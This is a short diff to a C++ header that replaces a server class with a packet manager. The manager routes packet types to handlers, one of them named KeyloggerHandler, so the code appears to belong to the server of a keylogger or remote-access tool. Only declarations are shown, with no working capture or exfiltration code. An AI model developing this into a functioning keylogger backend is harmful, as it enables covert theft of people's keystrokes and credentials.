@@ -21,18 +21,22 @@
 
 #pragma once
 
-class PacketMgr;
+enum Packet
+{
+    PACKET_UNK,
+    PACKET_KEYLOGGER,
+};
 
-class MindServer
+class PacketMgr
 {
 public:
-    MindServer(boost::asio::io_service& io_service, unsigned short port);
-    ~MindServer();
+    PacketMgr() { InitializeHandlers(); }
+    ~PacketMgr() {}
 
-    void HandleAccept(const boost::system::error_code& e, ConnectionPtr conn);
-    void HandleRead(const boost::system::error_code& e, ConnectionPtr conn);
-private:
-    boost::asio::ip::tcp::acceptor _acceptor;
-    std::vector<PacketStruct> _receivedData;
-    PacketMgr* packetMgr;
+    void InitializeHandlers();
+    void UnkPacketHandler(PacketStruct& _recvData, ConnectionPtr _connection);
+    void KeyloggerHandler(PacketStruct& _recvData, ConnectionPtr _connection);
+
+    bool HandlePacket(std::vector<PacketStruct> data, ConnectionPtr connection);
+    std::map<uint32_t /*id*/, std::function<void(PacketStruct&, ConnectionPtr)>> _packetsCallback;
 };
